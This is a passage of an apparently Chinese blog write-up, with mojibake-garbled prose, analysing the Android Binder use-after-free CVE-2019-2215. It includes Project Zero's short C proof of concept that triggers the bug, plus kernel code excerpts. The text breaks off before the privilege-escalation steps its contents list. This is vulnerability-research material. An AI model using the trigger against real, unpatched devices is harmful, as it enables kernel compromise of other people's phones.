<!doctype html><html lang=zh-cn dir=ltr><head><meta charset=utf-8><meta name=viewport content="width=device-width,initial-scale=1"><meta name=description content="CVE-2019-2215åˆ†æåˆ©ç”¨è®°å½•"><title>CVE-2019-2215åˆ†æåˆ©ç”¨è®°å½•</title><link rel=canonical href=https://ykiko.top/p/cve-2019-2215%E5%88%86%E6%9E%90%E5%88%A9%E7%94%A8%E8%AE%B0%E5%BD%95/><link rel=stylesheet href=/scss/style.min.8191399262444ab68b72a18c97392f5349be20a1615d77445be51e974c144cff.css><meta property="og:title" content="CVE-2019-2215åˆ†æåˆ©ç”¨è®°å½•"><meta property="og:description" content="CVE-2019-2215åˆ†æåˆ©ç”¨è®°å½•"><meta property="og:url" content="https://ykiko.top/p/cve-2019-2215%E5%88%86%E6%9E%90%E5%88%A9%E7%94%A8%E8%AE%B0%E5%BD%95/"><meta property="og:site_name" content="ykikoqAq"><meta property="og:type" content="article"><meta property="article:section" content="Post"><meta property="article:tag" content="CVE"><meta property="article:tag" content="Androidææƒ"><meta property="article:published_time" content="2020-06-30T01:15:26+08:00"><meta property="article:modified_time" content="2020-06-30T01:15:26+08:00"><meta name=twitter:title content="CVE-2019-2215åˆ†æåˆ©ç”¨è®°å½•"><meta name=twitter:description content="CVE-2019-2215åˆ†æåˆ©ç”¨è®°å½•"><link rel="shortcut icon" href=static/favicon.ico></head><body class=article-page><script>(function(){const e="StackColorScheme";localStorage.getItem(e)||localStorage.setItem(e,"auto")})()</script><script>(function(){const t="StackColorScheme",e=localStorage.getItem(t),n=window.matchMedia("(prefers-color-scheme: dark)").matches===!0;e=="dark"||e==="auto"&&n?document.documentElement.dataset.scheme="dark":document.documentElement.dataset.scheme="light"})()</script><div class="container main-container flex on-phone--column extended"><aside class="sidebar left-sidebar sticky"><button class="hamburger hamburger--spin" type=button id=toggle-menu aria-label=åˆ‡æ¢èœå•>
<span class=hamburger-box><span class=hamburger-inner></span></span></button><header><figure class=site-avatar><a href=/><img src=/img/wrlt_hu7776bd87ceaee6c7469d733bf0877a3e_443633_300x0_resize_q75_box.jpg width=300 height=296 class=site-logo loading=lazy alt=Avatar></a>
<span class=emoji>ğŸŒˆ</span></figure><div class=site-meta><h1 class=site-name><a href=/>ykikoqAq</a></h1><h2 class=site-description>å­¦ä¹ ã€åƒé¥­ã€ç¡è§‰ã€‚</h2></div></header><ol class=social-menu><li><a href=https://github.com/kuekiko target=_blank title=GitHub rel=me><svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-brand-github" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M9 19c-4.3 1.4-4.3-2.5-6-3m12 5v-3.5c0-1 .1-1.4-.5-2 2.8-.3 5.5-1.4 5.5-6a4.6 4.6.0 00-1.3-3.2 4.2 4.2.0 00-.1-3.2s-1.1-.3-3.5 1.3a12.3 12.3.0 00-6.2.0C6.5 2.8 5.4 3.1 5.4 3.1a4.2 4.2.0 00-.1 3.2A4.6 4.6.0 004 9.5c0 4.6 2.7 5.7 5.5 6-.6.6-.6 1.2-.5 2V21"/></svg></a></li><li><a href=https://twitter.com/kuekiko7 target=_blank title=Twitter rel=me><svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-brand-twitter" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M22 4.01c-1 .49-1.98.689-3 .99-1.121-1.265-2.783-1.335-4.38-.737S11.977 6.323 12 8v1c-3.245.083-6.135-1.395-8-4 0 0-4.182 7.433 4 11-1.872 1.247-3.739 2.088-6 2 3.308 1.803 6.913 2.423 10.034 1.517 3.58-1.04 6.522-3.723 7.651-7.742a13.84 13.84.0 00.497-3.753C20.18 7.773 21.692 5.25 22 4.009z"/></svg></a></li></ol><ol class=menu id=main-menu><li><a href=/><svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-home" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><polyline points="5 12 3 12 12 3 21 12 19 12"/><path d="M5 12v7a2 2 0 002 2h10a2 2 0 002-2v-7"/><path d="M9 21v-6a2 2 0 012-2h2a2 2 0 012 2v6"/></svg><span>ä¸»é¡µ</span></a></li><li><a href=/archives/><svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-archive" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><rect x="3" y="4" width="18" height="4" rx="2"/><path d="M5 8v10a2 2 0 002 2h10a2 2 0 002-2V8"/><line x1="10" y1="12" x2="14" y2="12"/></svg><span>Archives</span></a></li><li><a href=/about/><svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-user" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><circle cx="12" cy="7" r="4"/><path d="M6 21v-2a4 4 0 014-4h4a4 4 0 014 4v2"/></svg><span>About</span></a></li><li><a href=/reading/><!doctype html><svg t="1667664453010" class="icon" viewBox="0 0 1024 1024" xmlns="http://www.w3.org/2000/svg" p-id="6741" width="32" height="32" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M928 161H699.2c-49.1.0-97.1 14.1-138.4 40.7L512 233l-48.8-31.3C422 175.1 373.9 161 324.8 161H96c-17.7.0-32 14.3-32 32v568c0 17.7 14.3 32 32 32h228.8c49.1.0 97.1 14.1 138.4 40.7l44.4 28.6c1.3.8 2.8 1.3 4.3 1.3s3-.4 4.3-1.3l44.4-28.6C602 807.1 650.1 793 699.2 793H928c17.7.0 32-14.3 32-32V193c0-17.7-14.3-32-32-32zM324.8 721H136V233h188.8c35.4.0 69.8 10.1 99.5 29.2l48.8 31.3 6.9 4.5v462c-47.6-25.6-100.8-39-155.2-39zm563.2.0H699.2c-54.4.0-107.6 13.4-155.2 39V298l6.9-4.5 48.8-31.3c29.7-19.1 64.1-29.2 99.5-29.2H888v488z" p-id="6742" fill="#e6e6e6"/><path d="M396.9 361H211.1c-3.9.0-7.1 3.4-7.1 7.5v45c0 4.1 3.2 7.5 7.1 7.5h185.7c3.9.0 7.1-3.4 7.1-7.5v-45c.1-4.1-3.1-7.5-7-7.5zM620 368.5v45c0 4.1 3.2 7.5 7.1 7.5h185.7c3.9.0 7.1-3.4 7.1-7.5v-45c0-4.1-3.2-7.5-7.1-7.5H627.1c-3.9.0-7.1 3.4-7.1 7.5zM396.9 501H211.1c-3.9.0-7.1 3.4-7.1 7.5v45c0 4.1 3.2 7.5 7.1 7.5h185.7c3.9.0 7.1-3.4 7.1-7.5v-45c.1-4.1-3.1-7.5-7-7.5zm416 0H627.1c-3.9.0-7.1 3.4-7.1 7.5v45c0 4.1 3.2 7.5 7.1 7.5h185.7c3.9.0 7.1-3.4 7.1-7.5v-45c.1-4.1-3.1-7.5-7-7.5z" p-id="6743" fill="#e6e6e6"/></svg><span>Reading</span></a></li><li><a href=/todo/><!doctype html><svg t="1667664383494" class="icon" viewBox="0 0 1024 1024" xmlns="http://www.w3.org/2000/svg" p-id="5558" width="32" height="32" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M413.866667 853.333333c-14.933333.0-32-6.4-44.8-17.066666l-307.2-302.933334c-12.8-10.666667-19.2-25.6-19.2-42.666666s6.4-32 19.2-42.666667L172.8 339.2c23.466667-23.466667 64-23.466667 87.466667.0l307.2 300.8c12.8 10.666667 19.2 27.733333 19.2 42.666667.0 17.066667-6.4 32-19.2 42.666666l-110.933334 108.8c-10.666667 12.8-27.733333 19.2-42.666666 19.2zm-198.4-490.666666c-4.266667.0-10.666667 2.133333-14.933334 6.4L89.6 477.866667c-2.133333 4.266667-4.266667 8.533333-4.266667 12.8s2.133333 8.533333 6.4 12.8l309.333334 300.8c8.533333 8.533333 19.2 8.533333 27.733333.0l110.933333-108.8c4.266667-4.266667 6.4-8.533333 6.4-12.8s-2.133333-8.533333-6.4-12.8L230.4 369.066667c-4.266667-4.266667-8.533333-6.4-14.933333-6.4z" p-id="5559" fill="#e6e6e6"/><path d="M413.866667 853.333333c-14.933333.0-32-6.4-44.8-17.066666l-110.933334-108.8c-12.8-10.666667-19.2-27.733333-19.2-42.666667.0-17.066667 6.4-32 19.2-42.666667l505.6-497.066666c23.466667-23.466667 64-23.466667 87.466667.0l110.933333 108.8c12.8 10.666667 19.2 27.733333 19.2 42.666666s-6.4 32-19.2 42.666667l-505.6 497.066667c-10.666667 10.666667-27.733333 17.066667-42.666666 17.066666zM808.533333 170.666667c-4.266667.0-10.666667 2.133333-14.933333 6.4l-505.6 492.8c-4.266667 4.266667-6.4 8.533333-6.4 12.8s2.133333 8.533333 6.4 12.8l110.933333 108.8c8.533333 8.533333 19.2 8.533333 27.733334.0l505.6-494.933334c4.266667-4.266667 6.4-8.533333 6.4-12.8s-2.133333-8.533333-6.4-12.8l-110.933334-108.8c-4.266667-2.133333-8.533333-4.266667-12.8-4.266666z" p-id="5560" fill="#e6e6e6"/></svg><span>Todo</span></a></li><li><a href=/search/><svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-search" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><circle cx="10" cy="10" r="7"/><line x1="21" y1="21" x2="15" y2="15"/></svg><span>Search</span></a></li><li><a href=/%E5%8F%8B%E9%93%BE/><svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-link" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><path d="M10 14a3.5 3.5.0 005 0l4-4a3.5 3.5.0 00-5-5l-.5.5"/><path d="M14 10a3.5 3.5.0 00-5 0l-4 4a3.5 3.5.0 005 5l.5-.5"/></svg><span>å‹é“¾</span></a></li><li><a href=/%E7%8E%AF%E5%A2%83%E8%AE%B0%E5%BD%95/><!doctype html><svg t="1667664120722" class="icon" viewBox="0 0 1024 1024" xmlns="http://www.w3.org/2000/svg" p-id="3601" width="16" height="16" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M895.946487 1024H128.053513V128.124863h128.622073v63.991081H192.044594v767.892975h639.910812V192.115944h-66.230769V128.124863h130.22185V1024z" fill="#e6e6e6" p-id="3602"/><path d="M703.973244 256.107025H320.026756V64.133781h100.146042a95.986622 95.986622.0 01181.09476.0H703.973244zM384.017838 192.115944h255.964324V128.124863h-95.986621V96.129322a31.995541 31.995541.0 00-63.991082.0v31.995541h-95.986621zM319.706801 512.07135h383.946487v63.991081H319.706801zm0 127.982163h383.946487v63.991081H319.706801zm0 127.982162h383.946487v63.991081H319.706801zm0-383.946487h159.977703v63.991081H319.706801z" fill="#e6e6e6" p-id="3603"/></svg><span>ç¯å¢ƒè®°å½•</span></a></li><div class=menu-bottom-section><li id=i18n-switch><svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-language" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M4 5h7"/><path d="M9 3v2c0 4.418-2.239 8-5 8"/><path d="M5 9c-.003 2.144 2.952 3.908 6.7 4"/><path d="M12 20l4-9 4 9"/><path d="M19.1 18h-6.2"/></svg><select name=language onchange="window.location.href=this.selectedOptions[0].value"><option value=https://ykiko.top/en/>English</option><option value=https://ykiko.top/ selected>ä¸­æ–‡</option></select></li><li id=dark-mode-toggle><svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-toggle-left" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><circle cx="8" cy="12" r="2"/><rect x="2" y="6" width="20" height="12" rx="6"/></svg><svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-toggle-right" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><circle cx="16" cy="12" r="2"/><rect x="2" y="6" width="20" height="12" rx="6"/></svg><span>æš—è‰²æ¨¡å¼</span></li></div></ol></aside><aside class="sidebar right-sidebar sticky"><section class="widget archives"><div class=widget-icon><svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-hash" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><line x1="5" y1="9" x2="19" y2="9"/><line x1="5" y1="15" x2="19" y2="15"/><line x1="11" y1="4" x2="7" y2="20"/><line x1="17" y1="4" x2="13" y2="20"/></svg></div><h2 class="widget-title section-title">ç›®å½•</h2><div class=widget--toc><nav id=TableOfContents><ol><li><ol><li><a href=#0x00-å‰è¨€>0x00 å‰è¨€</a></li><li><a href=#0x01-åˆ†æç¯å¢ƒ>0x01 åˆ†æç¯å¢ƒ</a></li><li><a href=#0x02-æ¼æ´åˆ†æ>0x02 æ¼æ´åˆ†æ</a><ol><li><a href=#åŸç†åˆ†æ>åŸç†åˆ†æ</a></li><li><a href=#pocè°ƒè¯•åˆ†æ>Pocè°ƒè¯•åˆ†æ</a></li></ol></li><li><a href=#0x03-æ¼æ´åˆ©ç”¨>0x03 æ¼æ´åˆ©ç”¨</a><ol><li><a href=#patch-addr_limit>patch addr_limit</a></li><li><a href=#bypass-kaslr-and-disabling-selinux>bypass kaslr and Disabling SELinux</a></li><li><a href=#root>Root</a></li><li><a href=#disabling-seccomp>Disabling SECCOMP</a></li><li><a href=#patch>patch</a></li></ol></li><li><a href=#æ€»ç»“>æ€»ç»“</a><ol><li><a href=#å‚è€ƒ>å‚è€ƒ</a></li></ol></li></ol></li></ol></nav></div></section></aside><main class="main full-width"><article class=main-article><header class=article-header><div class=article-details><header class=article-category><a href=/categories/cve/>CVE</a>
<a href=/categories/android%E6%8F%90%E6%9D%83/>Androidææƒ</a>
<a href=/categories/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/>æ¼æ´åˆ†æ</a></header><div class=article-title-wrapper><h2 class=article-title><a href=/p/cve-2019-2215%E5%88%86%E6%9E%90%E5%88%A9%E7%94%A8%E8%AE%B0%E5%BD%95/>CVE-2019-2215åˆ†æåˆ©ç”¨è®°å½•</a></h2><h3 class=article-subtitle>CVE-2019-2215åˆ†æåˆ©ç”¨è®°å½•</h3></div><footer class=article-time><div><svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-calendar-time" width="56" height="56" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><path d="M11.795 21H5a2 2 0 01-2-2V7a2 2 0 012-2h12a2 2 0 012 2v4"/><circle cx="18" cy="18" r="4"/><path d="M15 3v4"/><path d="M7 3v4"/><path d="M3 11h16"/><path d="M18 16.496V18l1 1"/></svg><time class=article-time--published>2020-08-30</time></div><div><svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-clock" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><circle cx="12" cy="12" r="9"/><polyline points="12 7 12 12 15 15"/></svg><time class=article-time--reading>é˜…è¯»æ—¶é•¿: 14 åˆ†é’Ÿ</time></div></footer></div></header><section class=article-content><h3 id=0x00-å‰è¨€>0x00 å‰è¨€</h3><p><a class=link href="https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-2215" target=_blank rel=noopener>CVE-2019-2215</a>æœ€åˆæ˜¯ç”±syzbot(syzkaller bot)åœ¨2017å¹´å‘ç°çš„ä¸€ä¸ª<a class=link href=https://groups.google.com/forum/#!msg/syzkaller-bugs/QyXdgUhAF50/eLGkcwk9AQAJ target=_blank rel=noopener>bug</a>ï¼Œåœ¨2018å¹´åˆè¯¥bugè¢«ä¿®å¤ï¼Œæ²¡æœ‰åˆ†é…CVEç¼–å·ï¼Œä½†æ˜¯è¯¥è¡¥ä¸æ²¡æœ‰å‘åç§»æ¤åˆ°è®¸å¤šå·²å‘å¸ƒçš„è®¾å¤‡ä¸Š,æ¯”å¦‚Pixelå’Œpixel2ã€‚</p><p><strong>Project Zero</strong>çš„**Maddie Stone (@maddiestone)**æ ¹æ®Googleçš„å¨èƒæƒ…æŠ¥å°ç»„ï¼ˆTAGï¼‰çš„æƒ…æŠ¥æŠ¥å‘Šå†æ¬¡å‘ç°çš„è¯¥bugï¼Œå¥¹åœ¨2019å¹´9æœˆæŠ¥å‘Šäº†è¯¥<a class=link href="https://bugs.chromium.org/p/project-zero/issues/detail?id=1942" target=_blank rel=noopener>æ¼æ´</a>ã€‚TAGç¡®è®¤å…¶å·²ç”¨äºç°å®æ”»å‡»ä¸­ï¼ŒTAGè¡¨ç¤ºè¯¥æ¼æ´åˆ©ç”¨å¯èƒ½è·Ÿä¸€å®¶å‡ºå”®æ¼æ´å’Œåˆ©ç”¨å·¥å…·çš„ä»¥è‰²åˆ—å…¬å¸NSOæœ‰å…³ï¼ŒéšåNSOé›†å›¢å‘è¨€äººå…¬å¼€å¦è®¤ä¸è¯¥æ¼æ´å­˜åœ¨ä»»ä½•å…³ç³»ã€‚</p><h3 id=0x01-åˆ†æç¯å¢ƒ>0x01 åˆ†æç¯å¢ƒ</h3><ul><li>Android avd api29 x86_64</li><li>kernelï¼šq-goldfish-android-goldfish-4.14-dev commit id <code>7a3cee43e935b9d526ad07f20bf005ba7e74d05b</code></li><li>pixel Android 10 kernel 3.18</li></ul><h3 id=0x02-æ¼æ´åˆ†æ>0x02 æ¼æ´åˆ†æ</h3><p>æ¼æ´ä¸ºå†…æ ¸ä¸ŠBind IPCçš„ä¸€ä¸ªUAFæ¼æ´ï¼ŒæˆåŠŸåˆ©ç”¨å¯æœ¬åœ°ææƒï¼Œæ— éœ€è¿›è¡Œä»»ä½•äº¤äº’ï¼Œå·²è¢«æ¶æ„è½¯ä»¶åˆ©ç”¨ã€‚</p><h4 id=åŸç†åˆ†æ>åŸç†åˆ†æ</h4><p>å…ˆçœ‹ä¸€ä¸ªproject-zeroå…¬å¼€çš„<a class=link href="https://bugs.chromium.org/p/project-zero/issues/detail?id=1942" target=_blank rel=noopener>poc</a></p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span><span class=lnt>22
</span><span class=lnt>23
</span><span class=lnt>24
</span><span class=lnt>25
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-c data-lang=c><span class=line><span class=cl><span class=cm>/* 
</span></span></span><span class=line><span class=cl><span class=cm>binder_poll() passes the thread-&gt;wait waitqueue that
</span></span></span><span class=line><span class=cl><span class=cm>can be slept on for work. When a thread that uses
</span></span></span><span class=line><span class=cl><span class=cm>epoll explicitly exits using BINDER_THREAD_EXIT,
</span></span></span><span class=line><span class=cl><span class=cm>the waitqueue is freed, but it is never removed
</span></span></span><span class=line><span class=cl><span class=cm>from the corresponding epoll data structure. When
</span></span></span><span class=line><span class=cl><span class=cm>the process subsequently exits, the epoll cleanup
</span></span></span><span class=line><span class=cl><span class=cm>code tries to access the waitlist, which results in
</span></span></span><span class=line><span class=cl><span class=cm>a use-after-free. 
</span></span></span><span class=line><span class=cl><span class=cm>*/</span>
</span></span><span class=line><span class=cl><span class=cp>#include</span> <span class=cpf>&lt;fcntl.h&gt;</span><span class=cp>
</span></span></span><span class=line><span class=cl><span class=cp>#include</span> <span class=cpf>&lt;sys/epoll.h&gt;</span><span class=cp>
</span></span></span><span class=line><span class=cl><span class=cp>#include</span> <span class=cpf>&lt;sys/ioctl.h&gt;</span><span class=cp>
</span></span></span><span class=line><span class=cl><span class=cp>#include</span> <span class=cpf>&lt;stdio.h&gt;</span><span class=cp>
</span></span></span><span class=line><span class=cl><span class=cp>#define BINDER_THREAD_EXIT 0x40046208ul
</span></span></span><span class=line><span class=cl><span class=cp></span>
</span></span><span class=line><span class=cl><span class=kt>int</span> <span class=nf>main</span><span class=p>()</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=kt>int</span> <span class=n>fd</span><span class=p>,</span> <span class=n>epfd</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=k>struct</span> <span class=n>epoll_event</span> <span class=n>event</span> <span class=o>=</span> <span class=p>{.</span><span class=n>events</span> <span class=o>=</span> <span class=n>EPOLLIN</span><span class=p>};</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=n>fd</span> <span class=o>=</span> <span class=n>open</span><span class=p>(</span><span class=s>&#34;/dev/binder&#34;</span><span class=p>,</span> <span class=n>O_RDONLY</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=n>epfd</span> <span class=o>=</span> <span class=n>epoll_create</span><span class=p>(</span><span class=mi>1000</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=n>epoll_ctl</span><span class=p>(</span><span class=n>epfd</span><span class=p>,</span> <span class=n>EPOLL_CTL_ADD</span><span class=p>,</span> <span class=n>fd</span><span class=p>,</span> <span class=o>&amp;</span><span class=n>event</span><span class=p>);</span> <span class=c1>//[1]
</span></span></span><span class=line><span class=cl><span class=c1></span>    <span class=n>ioctl</span><span class=p>(</span><span class=n>fd</span><span class=p>,</span> <span class=n>BINDER_THREAD_EXIT</span><span class=p>,</span> <span class=nb>NULL</span><span class=p>);</span> <span class=c1>//[2]
</span></span></span><span class=line><span class=cl><span class=c1></span><span class=p>}</span>
</span></span></code></pre></td></tr></table></div></div><p>æ¼æ´åŸç†ä½œè€…è¯´çš„å¾ˆç®€å•å°±æ˜¯ä½¿ç”¨epollçº¿ç¨‹è°ƒç”¨BINDER_THREAD_EXITæ—¶ï¼Œä¼šæŠŠbinder_threadé‡Šæ”¾ï¼Œä½†æ˜¯æ²¡æœ‰åœ¨epollæ•°æ®ç»“æ„ä¸­æ¸…é™¤ï¼Œåœ¨åé¢è¿›ç¨‹ç»“æŸæˆ–è€…epollä¸»åŠ¨è°ƒç”¨EPOLL_CTL_DELæ—¶ï¼Œepollåˆä¼šå»éå†å‰é¢é‡Šæ”¾çš„binder_thread->waitï¼Œå¯¼è‡´UAFã€‚</p><p>æ—¢ç„¶æ˜¯ä¸ªUAFçš„æ¼æ´ï¼Œæˆ‘ä»¬ä¸»è¦å…³æ³¨ä¸‰ä¸ªç‚¹ï¼šbinder_threadçš„allocateã€freeã€useã€‚</p><ul><li><strong>allocate</strong></li></ul><p>åœ¨pocä¸­çš„[1]å¤„ï¼Œé€šè¿‡epoll_ctlåˆ›å»ºäº†ä¸€ä¸ªæ–°çš„ep_itemå¹¶ä¸”ç»‘å®šäº†fdï¼Œå°†å…¶æ’å…¥åˆ°event_pollçš„çº¢é»‘æ ‘ä¸­ã€‚fdä¸ºå‰é¢é€šè¿‡è°ƒç”¨open()åˆ›å»ºçš„binder_procç»“æ„ä½“å¹¶ä¸”<code>fd->pricate_data = binder_proc</code>ï¼Œepfdä¸ºè°ƒç”¨epoll_createåˆ›å»ºçš„ä¸€ä¸ªepollç»“æ„ä½“ï¼Œè¯¥ç»“æ„ä½“ä¼šæ·»åŠ åˆ°ç»“æ„ä½“é˜Ÿåˆ—ä¸Šã€‚ç»“æ„å¤§æ¦‚å¦‚å›¾ï¼Œ<a class=link href=https://github.com/sharif-dev/AndroidKernelVulnerability target=_blank rel=noopener>å›¾æ¥æº</a></p><p><img src=https://my-md-1253484710.file.myqcloud.com/20200628024448.png loading=lazy></p><ul><li><strong>free</strong></li></ul><p>pocä¸­çš„[2]å¤„ï¼Œè°ƒç”¨ioctlå¯¹fdè¿›è¡ŒBINDER_THREAD_EXITæ“ä½œï¼Œä»<code>fd->private_data</code>ä¸­é‡Šæ”¾<strong>binder_thread</strong>ç»“æ„ä½“ã€‚æ•´ä¸ªè°ƒç”¨æ ˆå¦‚ä¸‹å›¾æ‰€ç¤ºã€‚æœ€ç»ˆè°ƒç”¨åˆ°äº†binder_free_threadé‡Œçš„kfreeé‡Šæ”¾æ‰ã€‚</p><p><img src=https://my-md-1253484710.file.myqcloud.com/20200628102722.png loading=lazy></p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span><span class=lnt>5
</span><span class=lnt>6
</span><span class=lnt>7
</span><span class=lnt>8
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-c data-lang=c><span class=line><span class=cl><span class=k>static</span> <span class=kt>void</span> <span class=nf>binder_free_thread</span><span class=p>(</span><span class=k>struct</span> <span class=n>binder_thread</span> <span class=o>*</span><span class=kr>thread</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=p>{</span>
</span></span><span class=line><span class=cl>	<span class=n>BUG_ON</span><span class=p>(</span><span class=o>!</span><span class=n>list_empty</span><span class=p>(</span><span class=o>&amp;</span><span class=kr>thread</span><span class=o>-&gt;</span><span class=n>todo</span><span class=p>));</span>
</span></span><span class=line><span class=cl>	<span class=n>binder_stats_deleted</span><span class=p>(</span><span class=n>BINDER_STAT_THREAD</span><span class=p>);</span>
</span></span><span class=line><span class=cl>	<span class=n>binder_proc_dec_tmpref</span><span class=p>(</span><span class=kr>thread</span><span class=o>-&gt;</span><span class=n>proc</span><span class=p>);</span>
</span></span><span class=line><span class=cl>	<span class=n>put_task_struct</span><span class=p>(</span><span class=kr>thread</span><span class=o>-&gt;</span><span class=n>task</span><span class=p>);</span>
</span></span><span class=line><span class=cl>	<span class=n>kfree</span><span class=p>(</span><span class=kr>thread</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span></code></pre></td></tr></table></div></div><ul><li><strong>use</strong></li></ul><p>åœ¨å½“å‰çº¿ç¨‹é€€å‡ºæ—¶ï¼Œä¼šè‡ªåŠ¨è°ƒç”¨<strong>epoll_ctl(epfd, DEL, fd, event)</strong>ï¼Œè¿™é‡Œé¢ä¼šè°ƒç”¨åˆ°<strong>ep_remove(event_poll, ep_item)</strong>ï¼Œè¿™ä¸ªæ–¹æ³•é‡Œé¢ä¼šè¿›è¡Œunlink wait queuesåŒé“¾è¡¨æ“ä½œï¼Œå…¶ä¸­çš„æ“ä½œ<code>entry = wait->entry;</code>è¿™é‡Œçš„æŒ‡é’ˆæŒ‡å‘å·²ç»é‡Šæ”¾çš„binder_thread->waitã€‚é€ æˆuse after freeã€‚</p><p><img src=https://my-md-1253484710.file.myqcloud.com/eq_remove_queue.png loading=lazy></p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span><span class=lnt>22
</span><span class=lnt>23
</span><span class=lnt>24
</span><span class=lnt>25
</span><span class=lnt>26
</span><span class=lnt>27
</span><span class=lnt>28
</span><span class=lnt>29
</span><span class=lnt>30
</span><span class=lnt>31
</span><span class=lnt>32
</span><span class=lnt>33
</span><span class=lnt>34
</span><span class=lnt>35
</span><span class=lnt>36
</span><span class=lnt>37
</span><span class=lnt>38
</span><span class=lnt>39
</span><span class=lnt>40
</span><span class=lnt>41
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-c data-lang=c><span class=line><span class=cl><span class=k>static</span> <span class=kt>void</span> <span class=nf>ep_remove_wait_queue</span><span class=p>(</span><span class=k>struct</span> <span class=n>eppoll_entry</span> <span class=o>*</span><span class=n>pwq</span><span class=p>)</span>  <span class=c1>//è¿™é‡Œçš„pwqå°±æ˜¯æˆ‘ä»¬å·²ç»é‡Šæ”¾æ‰çš„binder_thread
</span></span></span><span class=line><span class=cl><span class=c1></span><span class=p>{</span>
</span></span><span class=line><span class=cl>	<span class=n>wait_queue_head_t</span> <span class=o>*</span><span class=n>whead</span><span class=p>;</span>
</span></span><span class=line><span class=cl>	<span class=n>rcu_read_lock</span><span class=p>();</span>
